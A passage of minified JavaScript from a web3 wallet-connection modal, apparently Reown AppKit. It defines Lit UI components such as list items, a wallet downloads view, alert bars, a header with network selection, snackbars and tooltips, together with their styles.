    padding: 6px 18px 6px 9px;
  }

  button > wui-flex {
    flex: 1;
  }

  button > wui-image {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
    border-radius: var(--wui-border-radius-3xl);
  }

  button > wui-icon {
    width: 36px;
    height: 36px;
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }

  button > wui-icon-box[data-variant='blue'] {
    box-shadow: 0 0 0 2px var(--wui-color-accent-glass-005);
  }

  button > wui-icon-box[data-variant='overlay'] {
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
  }

  button > wui-icon-box[data-variant='square-blue'] {
    border-radius: var(--wui-border-radius-3xs);
    position: relative;
    border: none;
    width: 36px;
    height: 36px;
  }

  button > wui-icon-box[data-variant='square-blue']::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-accent-glass-010);
    pointer-events: none;
  }

  button > wui-icon:last-child {
    width: 14px;
    height: 14px;
  }

  button:disabled {
    color: var(--wui-color-gray-glass-020);
  }

  button[data-loading='true'] > wui-icon {
    opacity: 0;
  }

  wui-loading-spinner {
    position: absolute;
    right: 18px;
    top: 50%;
    transform: translateY(-50%);
  }
`;var Bu=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ec=class extends he{constructor(){super(...arguments),this.tabIdx=void 0,this.variant="icon",this.disabled=!1,this.imageSrc=void 0,this.alt=void 0,this.chevron=!1,this.loading=!1}render(){return F`
      <button
        ?disabled=${this.loading?!0:!!this.disabled}
        data-loading=${this.loading}
        data-iconvariant=${ye(this.iconVariant)}
        tabindex=${ye(this.tabIdx)}
      >
        ${this.loadingTemplate()} ${this.visualTemplate()}
        <wui-flex gap="3xs">
          <slot></slot>
        </wui-flex>
        ${this.chevronTemplate()}
      </button>
    `}visualTemplate(){if(this.variant==="image"&&this.imageSrc)return F`<wui-image src=${this.imageSrc} alt=${this.alt??"list item"}></wui-image>`;if(this.iconVariant==="square"&&this.icon&&this.variant==="icon")return F`<wui-icon name=${this.icon}></wui-icon>`;if(this.variant==="icon"&&this.icon&&this.iconVariant){const e=["blue","square-blue"].includes(this.iconVariant)?"accent-100":"fg-200",t=this.iconVariant==="square-blue"?"mdl":"md",i=this.iconSize?this.iconSize:t;return F`
        <wui-icon-box
          data-variant=${this.iconVariant}
          icon=${this.icon}
          iconSize=${i}
          background="transparent"
          iconColor=${e}
          backgroundColor=${e}
          size=${t}
        ></wui-icon-box>
      `}return null}loadingTemplate(){return this.loading?F`<wui-loading-spinner
        data-testid="wui-list-item-loading-spinner"
        color="fg-300"
      ></wui-loading-spinner>`:F``}chevronTemplate(){return this.chevron?F`<wui-icon size="inherit" color="fg-200" name="chevronRight"></wui-icon>`:null}};Ec.styles=[Ii,vo,Jht];Bu([V()],Ec.prototype,"icon",void 0);Bu([V()],Ec.prototype,"iconSize",void 0);Bu([V()],Ec.prototype,"tabIdx",void 0);Bu([V()],Ec.prototype,"variant",void 0);Bu([V()],Ec.prototype,"iconVariant",void 0);Bu([V({type:Boolean})],Ec.prototype,"disabled",void 0);Bu([V()],Ec.prototype,"imageSrc",void 0);Bu([V()],Ec.prototype,"alt",void 0);Bu([V({type:Boolean})],Ec.prototype,"chevron",void 0);Bu([V({type:Boolean})],Ec.prototype,"loading",void 0);Ec=Bu([Ot("wui-list-item")],Ec);var Qht=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let t$=class extends he{constructor(){super(...arguments),this.wallet=tt.state.data?.wallet}render(){if(!this.wallet)throw new Error("w3m-downloads-view");return F`
      <wui-flex gap="xs" flexDirection="column" .padding=${["s","s","l","s"]}>
        ${this.chromeTemplate()} ${this.iosTemplate()} ${this.androidTemplate()}
        ${this.homepageTemplate()}
      </wui-flex>
    `}chromeTemplate(){return this.wallet?.chrome_store?F`<wui-list-item
      variant="icon"
      icon="chromeStore"
      iconVariant="square"
      @click=${this.onChromeStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Chrome Extension</wui-text>
    </wui-list-item>`:null}iosTemplate(){return this.wallet?.app_store?F`<wui-list-item
      variant="icon"
      icon="appStore"
      iconVariant="square"
      @click=${this.onAppStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">iOS App</wui-text>
    </wui-list-item>`:null}androidTemplate(){return this.wallet?.play_store?F`<wui-list-item
      variant="icon"
      icon="playStore"
      iconVariant="square"
      @click=${this.onPlayStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Android App</wui-text>
    </wui-list-item>`:null}homepageTemplate(){return this.wallet?.homepage?F`
      <wui-list-item
        variant="icon"
        icon="browser"
        iconVariant="square-blue"
        @click=${this.onHomePage.bind(this)}
        chevron
      >
        <wui-text variant="paragraph-500" color="fg-100">Website</wui-text>
      </wui-list-item>
    `:null}onChromeStore(){this.wallet?.chrome_store&&Ze.openHref(this.wallet.chrome_store,"_blank")}onAppStore(){this.wallet?.app_store&&Ze.openHref(this.wallet.app_store,"_blank")}onPlayStore(){this.wallet?.play_store&&Ze.openHref(this.wallet.play_store,"_blank")}onHomePage(){this.wallet?.homepage&&Ze.openHref(this.wallet.homepage,"_blank")}};t$=Qht([Ot("w3m-downloads-view")],t$);const Xht=Object.freeze(Object.defineProperty({__proto__:null,get W3mAllWalletsView(){return Wy},get W3mConnectingWcBasicView(){return xx},get W3mDownloadsView(){return t$}},Symbol.toStringTag,{value:"Module"})),e0t=ge`
  :host {
    display: block;
    border-radius: clamp(0px, var(--wui-border-radius-l), 44px);
    box-shadow: 0 0 0 1px var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-modal-bg);
    overflow: hidden;
  }

  :host([data-embedded='true']) {
    box-shadow:
      0 0 0 1px var(--wui-color-gray-glass-005),
      0px 4px 12px 4px var(--w3m-card-embedded-shadow-color);
  }
`;var t0t=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let r$=class extends he{render(){return F`<slot></slot>`}};r$.styles=[Ii,e0t];r$=t0t([Ot("wui-card")],r$);const r0t=ge`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-dark-glass-100);
    box-sizing: border-box;
    background-color: var(--wui-color-bg-325);
    box-shadow: 0px 0px 16px 0px rgba(0, 0, 0, 0.25);
  }

  wui-flex {
    width: 100%;
  }

  wui-text {
    word-break: break-word;
    flex: 1;
  }

  .close {
    cursor: pointer;
  }

  .icon-box {
    height: 40px;
    width: 40px;
    border-radius: var(--wui-border-radius-3xs);
    background-color: var(--local-icon-bg-value);
  }
`;var m6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let qg=class extends he{constructor(){super(...arguments),this.message="",this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="info"}render(){return this.style.cssText=`
      --local-icon-bg-value: var(--wui-color-${this.backgroundColor});
   `,F`
      <wui-flex flexDirection="row" justifyContent="space-between" alignItems="center">
        <wui-flex columnGap="xs" flexDirection="row" alignItems="center">
          <wui-flex
            flexDirection="row"
            alignItems="center"
            justifyContent="center"
            class="icon-box"
          >
            <wui-icon color=${this.iconColor} size="md" name=${this.icon}></wui-icon>
          </wui-flex>
          <wui-text variant="small-500" color="bg-350" data-testid="wui-alertbar-text"
            >${this.message}</wui-text
          >
        </wui-flex>
        <wui-icon
          class="close"
          color="bg-350"
          size="sm"
          name="close"
          @click=${this.onClose}
        ></wui-icon>
      </wui-flex>
    `}onClose(){ou.close()}};qg.styles=[Ii,r0t];m6([V()],qg.prototype,"message",void 0);m6([V()],qg.prototype,"backgroundColor",void 0);m6([V()],qg.prototype,"iconColor",void 0);m6([V()],qg.prototype,"icon",void 0);qg=m6([Ot("wui-alertbar")],qg);const i0t=ge`
  :host {
    display: block;
    position: absolute;
    top: var(--wui-spacing-s);
    left: var(--wui-spacing-l);
    right: var(--wui-spacing-l);
    opacity: 0;
    pointer-events: none;
  }
`;var dae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const n0t={info:{backgroundColor:"fg-350",iconColor:"fg-325",icon:"info"},success:{backgroundColor:"success-glass-reown-020",iconColor:"success-125",icon:"checkmark"},warning:{backgroundColor:"warning-glass-reown-020",iconColor:"warning-100",icon:"warningCircle"},error:{backgroundColor:"error-glass-reown-020",iconColor:"error-125",icon:"exclamationTriangle"}};let Ax=class extends he{constructor(){super(),this.unsubscribe=[],this.open=ou.state.open,this.onOpen(!0),this.unsubscribe.push(ou.subscribeKey("open",e=>{this.open=e,this.onOpen(!1)}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{message:e,variant:t}=ou.state,i=n0t[t];return F`
      <wui-alertbar
        message=${e}
        backgroundColor=${i?.backgroundColor}
        iconColor=${i?.iconColor}
        icon=${i?.icon}
      ></wui-alertbar>
    `}onOpen(e){this.open?(this.animate([{opacity:0,transform:"scale(0.85)"},{opacity:1,transform:"scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.style.cssText="pointer-events: auto"):e||(this.animate([{opacity:1,transform:"scale(1)"},{opacity:0,transform:"scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"}),this.style.cssText="pointer-events: none")}};Ax.styles=i0t;dae([te()],Ax.prototype,"open",void 0);Ax=dae([Ot("w3m-alertbar")],Ax);const s0t=ge`
  button {
    border-radius: var(--local-border-radius);
    color: var(--wui-color-fg-100);
    padding: var(--local-padding);
  }

  @media (max-width: 700px) {
    button {
      padding: var(--wui-spacing-s);
    }
  }

  button > wui-icon {
    pointer-events: none;
  }

  button:disabled > wui-icon {
    color: var(--wui-color-bg-300) !important;
  }

  button:disabled {
    background-color: transparent;
  }
`;var w6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let zg=class extends he{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.icon="copy",this.iconColor="inherit"}render(){const e=this.size==="lg"?"--wui-border-radius-xs":"--wui-border-radius-xxs",t=this.size==="lg"?"--wui-spacing-1xs":"--wui-spacing-2xs";return this.style.cssText=`
    --local-border-radius: var(${e});
    --local-padding: var(${t});
`,F`
      <button ?disabled=${this.disabled}>
        <wui-icon color=${this.iconColor} size=${this.size} name=${this.icon}></wui-icon>
      </button>
    `}};zg.styles=[Ii,vo,c6,s0t];w6([V()],zg.prototype,"size",void 0);w6([V({type:Boolean})],zg.prototype,"disabled",void 0);w6([V()],zg.prototype,"icon",void 0);w6([V()],zg.prototype,"iconColor",void 0);zg=w6([Ot("wui-icon-link")],zg);const o0t=ge`
  button {
    display: block;
    display: flex;
    align-items: center;
    padding: var(--wui-spacing-xxs);
    gap: var(--wui-spacing-xxs);
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-md);
    border-radius: var(--wui-border-radius-xxs);
  }

  wui-image {
    border-radius: 100%;
    width: var(--wui-spacing-xl);
    height: var(--wui-spacing-xl);
  }

  wui-icon-box {
    width: var(--wui-spacing-xl);
    height: var(--wui-spacing-xl);
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-002);
  }

  button:active {
    background-color: var(--wui-color-gray-glass-005);
  }
`;var hae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ix=class extends he{constructor(){super(...arguments),this.imageSrc=""}render(){return F`<button>
      ${this.imageTemplate()}
      <wui-icon size="xs" color="fg-200" name="chevronBottom"></wui-icon>
    </button>`}imageTemplate(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt="select visual"></wui-image>`:F`<wui-icon-box
      size="xxs"
      iconColor="fg-200"
      backgroundColor="fg-100"
      background="opaque"
      icon="networkPlaceholder"
    ></wui-icon-box>`}};Ix.styles=[Ii,vo,c6,o0t];hae([V()],Ix.prototype,"imageSrc",void 0);Ix=hae([Ot("wui-select")],Ix);const a0t=ge`
  :host {
    height: 64px;
  }

  wui-text {
    text-transform: capitalize;
  }

  wui-flex.w3m-header-title {
    transform: translateY(0);
    opacity: 1;
  }

  wui-flex.w3m-header-title[view-direction='prev'] {
    animation:
      slide-down-out 120ms forwards var(--wui-ease-out-power-2),
      slide-down-in 120ms forwards var(--wui-ease-out-power-2);
    animation-delay: 0ms, 200ms;
  }

  wui-flex.w3m-header-title[view-direction='next'] {
    animation:
      slide-up-out 120ms forwards var(--wui-ease-out-power-2),
      slide-up-in 120ms forwards var(--wui-ease-out-power-2);
    animation-delay: 0ms, 200ms;
  }

  wui-icon-link[data-hidden='true'] {
    opacity: 0 !important;
    pointer-events: none;
  }

  @keyframes slide-up-out {
    from {
      transform: translateY(0px);
      opacity: 1;
    }
    to {
      transform: translateY(3px);
      opacity: 0;
    }
  }

  @keyframes slide-up-in {
    from {
      transform: translateY(-3px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }

  @keyframes slide-down-out {
    from {
      transform: translateY(0px);
      opacity: 1;
    }
    to {
      transform: translateY(-3px);
      opacity: 0;
    }
  }

  @keyframes slide-down-in {
    from {
      transform: translateY(3px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }
`;var F0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const c0t=["SmartSessionList"];function jT(){const r=tt.state.data?.connector?.name,e=tt.state.data?.wallet?.name,t=tt.state.data?.network?.name,i=e??r,n=We.getConnectors();return{Connect:`Connect ${n.length===1&&n[0]?.id==="w3m-email"?"Email":""} Wallet`,Create:"Create Wallet",ChooseAccountName:void 0,Account:void 0,AccountSettings:void 0,AllWallets:"All Wallets",ApproveTransaction:"Approve Transaction",BuyInProgress:"Buy",ConnectingExternal:i??"Connect Wallet",ConnectingWalletConnect:i??"WalletConnect",ConnectingWalletConnectBasic:"WalletConnect",ConnectingSiwe:"Sign In",Convert:"Convert",ConvertSelectToken:"Select token",ConvertPreview:"Preview convert",Downloads:i?`Get ${i}`:"Downloads",EmailLogin:"Email Login",EmailVerifyOtp:"Confirm Email",EmailVerifyDevice:"Register Device",GetWallet:"Get a wallet",Networks:"Choose Network",OnRampProviders:"Choose Provider",OnRampActivity:"Activity",OnRampTokenSelect:"Select Token",OnRampFiatSelect:"Select Currency",Pay:"How you pay",Profile:void 0,SwitchNetwork:t??"Switch Network",SwitchAddress:"Switch Address",Transactions:"Activity",UnsupportedChain:"Switch Network",UpgradeEmailWallet:"Upgrade your Wallet",UpdateEmailWallet:"Edit Email",UpdateEmailPrimaryOtp:"Confirm Current Email",UpdateEmailSecondaryOtp:"Confirm New Email",WhatIsABuy:"What is Buy?",RegisterAccountName:"Choose name",RegisterAccountNameSuccess:"",WalletReceive:"Receive",WalletCompatibleNetworks:"Compatible Networks",Swap:"Swap",SwapSelectToken:"Select token",SwapPreview:"Preview swap",WalletSend:"Send",WalletSendPreview:"Review send",WalletSendSelectToken:"Select Token",WhatIsANetwork:"What is a network?",WhatIsAWallet:"What is a wallet?",ConnectWallets:"Connect wallet",ConnectSocials:"All socials",ConnectingSocial:qt.state.socialProvider?qt.state.socialProvider:"Connect Social",ConnectingMultiChain:"Select chain",ConnectingFarcaster:"Farcaster",SwitchActiveChain:"Switch chain",SmartSessionCreated:void 0,SmartSessionList:"Smart Sessions",SIWXSignMessage:"Sign In",PayLoading:"Payment in progress"}}let Su=class extends he{constructor(){super(),this.unsubscribe=[],this.heading=jT()[tt.state.view],this.network=de.state.activeCaipNetwork,this.networkImage=Es.getNetworkImage(this.network),this.showBack=!1,this.prevHistoryLength=1,this.view=tt.state.view,this.viewDirection="",this.headerText=jT()[tt.state.view],this.unsubscribe.push(Ia.subscribeNetworkImages(()=>{this.networkImage=Es.getNetworkImage(this.network)}),tt.subscribeKey("view",e=>{setTimeout(()=>{this.view=e,this.headerText=jT()[e]},jf.ANIMATION_DURATIONS.HeaderText),this.onViewChange(),this.onHistoryChange()}),de.subscribeKey("activeCaipNetwork",e=>{this.network=e,this.networkImage=Es.getNetworkImage(this.network)}))}disconnectCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex .padding=${this.getPadding()} justifyContent="space-between" alignItems="center">
        ${this.leftHeaderTemplate()} ${this.titleTemplate()} ${this.rightHeaderTemplate()}
      </wui-flex>
    `}onWalletHelp(){Hr.sendEvent({type:"track",event:"CLICK_WALLET_HELP"}),tt.push("WhatIsAWallet")}async onClose(){await Qoe.safeClose()}rightHeaderTemplate(){const e=Be?.state?.features?.smartSessions;return tt.state.view!=="Account"||!e?this.closeButtonTemplate():F`<wui-flex>
      <wui-icon-link
        icon="clock"
        @click=${()=>tt.push("SmartSessionList")}
        data-testid="w3m-header-smart-sessions"
      ></wui-icon-link>
      ${this.closeButtonTemplate()}
    </wui-flex> `}closeButtonTemplate(){return F`
      <wui-icon-link
        icon="close"
        @click=${this.onClose.bind(this)}
        data-testid="w3m-header-close"
      ></wui-icon-link>
    `}titleTemplate(){const e=c0t.includes(this.view);return F`
      <wui-flex
        view-direction="${this.viewDirection}"
        class="w3m-header-title"
        alignItems="center"
        gap="xs"
      >
        <wui-text variant="paragraph-700" color="fg-100" data-testid="w3m-header-text"
          >${this.headerText}</wui-text
        >
        ${e?F`<wui-tag variant="main">Beta</wui-tag>`:null}
      </wui-flex>
    `}leftHeaderTemplate(){const{view:e}=tt.state,t=e==="Connect",i=Be.state.enableEmbedded,n=e==="ApproveTransaction",s=e==="ConnectingSiwe",o=e==="Account",a=Be.state.enableNetworkSwitch,c=n||s||t&&i;return o&&a?F`<wui-select
        id="dynamic"
        data-testid="w3m-account-select-network"
        active-network=${ye(this.network?.name)}
        @click=${this.onNetworks.bind(this)}
        imageSrc=${ye(this.networkImage)}
      ></wui-select>`:this.showBack&&!c?F`<wui-icon-link
        data-testid="header-back"
        id="dynamic"
        icon="chevronLeft"
        @click=${this.onGoBack.bind(this)}
      ></wui-icon-link>`:F`<wui-icon-link
      data-hidden=${!t}
      id="dynamic"
      icon="helpCircle"
      @click=${this.onWalletHelp.bind(this)}
    ></wui-icon-link>`}onNetworks(){this.isAllowedNetworkSwitch()&&(Hr.sendEvent({type:"track",event:"CLICK_NETWORKS"}),tt.push("Networks"))}isAllowedNetworkSwitch(){const e=de.getAllRequestedCaipNetworks(),t=e?e.length>1:!1,i=e?.find(({id:n})=>n===this.network?.id);return t||!i}getPadding(){return this.heading?["l","2l","l","2l"]:["0","2l","0","2l"]}onViewChange(){const{history:e}=tt.state;let t=jf.VIEW_DIRECTION.Next;e.length<this.prevHistoryLength&&(t=jf.VIEW_DIRECTION.Prev),this.prevHistoryLength=e.length,this.viewDirection=t}async onHistoryChange(){const{history:e}=tt.state,t=this.shadowRoot?.querySelector("#dynamic");e.length>1&&!this.showBack&&t?(await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!0,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"})):e.length<=1&&this.showBack&&t&&(await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!1,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}onGoBack(){tt.goBack()}};Su.styles=a0t;F0([te()],Su.prototype,"heading",void 0);F0([te()],Su.prototype,"network",void 0);F0([te()],Su.prototype,"networkImage",void 0);F0([te()],Su.prototype,"showBack",void 0);F0([te()],Su.prototype,"prevHistoryLength",void 0);F0([te()],Su.prototype,"view",void 0);F0([te()],Su.prototype,"viewDirection",void 0);F0([te()],Su.prototype,"headerText",void 0);Su=F0([Ot("w3m-header")],Su);const l0t=ge`
  :host {
    display: flex;
    column-gap: var(--wui-spacing-s);
    align-items: center;
    padding: var(--wui-spacing-xs) var(--wui-spacing-m) var(--wui-spacing-xs) var(--wui-spacing-xs);
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-gray-glass-005);
    box-sizing: border-box;
    background-color: var(--wui-color-bg-175);
    box-shadow:
      0px 14px 64px -4px rgba(0, 0, 0, 0.15),
      0px 8px 22px -6px rgba(0, 0, 0, 0.15);

    max-width: 300px;
  }

  :host wui-loading-spinner {
    margin-left: var(--wui-spacing-3xs);
  }
`;var N2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let _0=class extends he{constructor(){super(...arguments),this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="checkmark",this.message="",this.loading=!1,this.iconType="default"}render(){return F`
      ${this.templateIcon()}
      <wui-text variant="paragraph-500" color="fg-100" data-testid="wui-snackbar-message"
        >${this.message}</wui-text
      >
    `}templateIcon(){return this.loading?F`<wui-loading-spinner size="md" color="accent-100"></wui-loading-spinner>`:this.iconType==="default"?F`<wui-icon size="xl" color=${this.iconColor} name=${this.icon}></wui-icon>`:F`<wui-icon-box
      size="sm"
      iconSize="xs"
      iconColor=${this.iconColor}
      backgroundColor=${this.backgroundColor}
      icon=${this.icon}
      background="opaque"
    ></wui-icon-box>`}};_0.styles=[Ii,l0t];N2([V()],_0.prototype,"backgroundColor",void 0);N2([V()],_0.prototype,"iconColor",void 0);N2([V()],_0.prototype,"icon",void 0);N2([V()],_0.prototype,"message",void 0);N2([V()],_0.prototype,"loading",void 0);N2([V()],_0.prototype,"iconType",void 0);_0=N2([Ot("wui-snackbar")],_0);const u0t=ge`
  :host {
    display: block;
    position: absolute;
    opacity: 0;
    pointer-events: none;
    top: 11px;
    left: 50%;
    width: max-content;
  }
`;var fae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const d0t={loading:void 0,success:{backgroundColor:"success-100",iconColor:"success-100",icon:"checkmark"},error:{backgroundColor:"error-100",iconColor:"error-100",icon:"close"}};let Tx=class extends he{constructor(){super(),this.unsubscribe=[],this.timeout=void 0,this.open=ts.state.open,this.unsubscribe.push(ts.subscribeKey("open",e=>{this.open=e,this.onOpen()}))}disconnectedCallback(){clearTimeout(this.timeout),this.unsubscribe.forEach(e=>e())}render(){const{message:e,variant:t,svg:i}=ts.state,n=d0t[t],{icon:s,iconColor:o}=i??n??{};return F`
      <wui-snackbar
        message=${e}
        backgroundColor=${n?.backgroundColor}
        iconColor=${o}
        icon=${s}
        .loading=${t==="loading"}
      ></wui-snackbar>
    `}onOpen(){clearTimeout(this.timeout),this.open?(this.animate([{opacity:0,transform:"translateX(-50%) scale(0.85)"},{opacity:1,transform:"translateX(-50%) scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.timeout&&clearTimeout(this.timeout),ts.state.autoClose&&(this.timeout=setTimeout(()=>ts.hide(),2500))):this.animate([{opacity:1,transform:"translateX(-50%) scale(1)"},{opacity:0,transform:"translateX(-50%) scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"})}};Tx.styles=u0t;fae([te()],Tx.prototype,"open",void 0);Tx=fae([Ot("w3m-snackbar")],Tx);const h0t=ge`
  :host {
    pointer-events: none;
  }

  :host > wui-flex {
    display: var(--w3m-tooltip-display);
    opacity: var(--w3m-tooltip-opacity);
    padding: 9px var(--wui-spacing-s) 10px var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    color: var(--wui-color-bg-100);
    position: fixed;
    top: var(--w3m-tooltip-top);
    left: var(--w3m-tooltip-left);
    transform: translate(calc(-50% + var(--w3m-tooltip-parent-width)), calc(-100% - 8px));
    max-width: calc(var(--w3m-modal-width) - var(--wui-spacing-xl));
    transition: opacity 0.2s var(--wui-ease-out-power-2);
    will-change: opacity;
  }

  :host([data-variant='shade']) > wui-flex {
    background-color: var(--wui-color-bg-150);
    border: 1px solid var(--wui-color-gray-glass-005);
  }

  :host([data-variant='shade']) > wui-flex > wui-text {
    color: var(--wui-color-fg-150);
  }

  :host([data-variant='fill']) > wui-flex {
    background-color: var(--wui-color-fg-100);
    border: none;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
    color: var(--wui-color-bg-150);
  }

  wui-icon[data-placement='top'] {
    bottom: 0px;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }
`;var b6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Wg=class extends he{constructor(){super(),this.unsubscribe=[],this.open=jm.state.open,this.message=jm.state.message,this.triggerRect=jm.state.triggerRect,this.variant=jm.state.variant,this.unsubscribe.push(jm.subscribe(e=>{this.open=e.open,this.message=e.message,this.triggerRect=e.triggerRect,this.variant=e.variant}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){this.dataset.variant=this.variant;const e=this.triggerRect.top,t=this.triggerRect.left;return this.style.cssText=`
    --w3m-tooltip-top: ${e}px;
    --w3m-tooltip-left: ${t}px;
    --w3m-tooltip-parent-width: ${this.triggerRect.width/2}px;
    --w3m-tooltip-display: ${this.open?"flex":"none"};
    --w3m-tooltip-opacity: ${this.open?1:0};
    `,F`<wui-flex>
      <wui-icon data-placement="top" color="fg-100" size="inherit" name="cursor"></wui-icon>
      <wui-text color="inherit" variant="small-500">${this.message}</wui-text>
    </wui-flex>`}};Wg.styles=[h0t];b6([te()],Wg.prototype,"open",void 0);b6([te()],Wg.prototype,"message",void 0);b6([te()],Wg.prototype,"triggerRect",void 0);b6([te()],Wg.prototype,"variant",void 0);Wg=b6([Ot("w3m-tooltip"),Ot("w3m-tooltip")],Wg);const f0t=ge`
  :host {
    --prev-height: 0px;
    --new-height: 0px;
    display: block;
  }

  div.w3m-router-container {
    transform: translateY(0);
    opacity: 1;
  }

  div.w3m-router-container[view-direction='prev'] {
    animation:
      slide-left-out 150ms forwards ease,
      slide-left-in 150ms forwards ease;
    animation-delay: 0ms, 200ms;
  }

  div.w3m-router-container[view-direction='next'] {
    animation:
      slide-right-out 150ms forwards ease,
      slide-right-in 150ms forwards ease;
    animation-delay: 0ms, 200ms;
  }

  @keyframes slide-left-out {
    from {
      transform: translateX(0px);
